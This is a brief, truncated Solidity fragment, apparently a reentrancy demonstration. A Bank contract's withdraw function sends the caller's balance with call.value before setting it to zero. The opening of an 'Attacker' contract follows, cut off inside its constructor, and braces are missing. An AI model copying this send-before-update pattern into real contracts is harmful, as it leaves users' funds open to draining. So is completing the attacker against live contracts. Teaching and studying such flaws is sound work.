Bank.sol
function withdraw(){
require(msg.sender.call.value(balances[msg.sender])());
balances[msg.sender]=0;
contract Attacker{
address public bankAddr;
uint attackCount = 0;
constructor(address _bank){
bankAddr = _bank;
